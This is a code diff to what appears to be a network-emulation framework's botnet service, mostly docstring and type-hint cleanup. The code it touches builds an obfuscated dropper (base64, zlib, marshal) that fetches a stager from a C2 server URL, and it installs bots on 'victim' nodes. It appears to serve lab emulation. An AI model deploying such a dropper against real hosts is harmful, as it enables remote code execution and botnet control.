@@ -42,7 +42,6 @@ class BotnetServer(Server):
 
         @param node node.
         """
-        asn = node.getAsn()
         self.__node = node
         self.__port = 445
         try:
@@ -88,19 +87,18 @@ class BotnetClient(Server):
     __node: Node
     __port: int
 
-    def __init__(self, node: Node, C2ServerIp):
+    def __init__(self, node: Node, C2ServerIp: str):
         """!
         @brief BotnetClient constructor.
 
-        @:param node node.
-        @:param C2ServerIp use for connecting C2 server
+        @param node node.
+        @param C2ServerIp use for connecting C2 server
         """
-        self.__c2_server_url = 'http://'+C2ServerIp+':446//stagers/b6H.py'
+        self.__c2_server_url = 'http://{}:446//stagers/b6H.py'.format(C2ServerIp)
         self.__c2_server_ip = C2ServerIp
         self.__dropper = BotnetServerFileTemplates['dropper']\
             .format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()"
                                                                       .format(repr(self.__c2_server_url)),2)))))
-        asn = node.getAsn()
         self.__node = node
         self.__port = 445
 
@@ -150,8 +148,10 @@ class BotnetService(Service):
 
     def installC2(self, node: Node) -> BotnetServer:
         """!
-        @brif install C2 server to node
-        @:param node, the node of attacker
+        @brief install C2 server to node
+        @param node the node of attacker
+
+        @returns botnet server.
         """
         server: BotnetServer = node.getAttribute('__botnet_service_server')
         if server != None: return server
@@ -160,11 +160,14 @@ class BotnetService(Service):
         node.setAttribute('__botnet_service_server', server)
         return server
 
-    def installBot(self, node: Node, C2ServerIp) -> BotnetClient:
+    def installBot(self, node: Node, C2ServerIp: str) -> BotnetClient:
         """!
-        @brif install bot client to node
-        @:param node, the node of victim or bot
-        @:param C2ServerIp, the IP of C2 server
+        @brief install bot client to node
+
+        @param node the node of victim or bot
+        @param C2ServerIp the IP of C2 server
+
+        @returns botnet client.
         """
         server: BotnetClient = node.getAttribute('__botnet_service_client')
         if server != None: return server
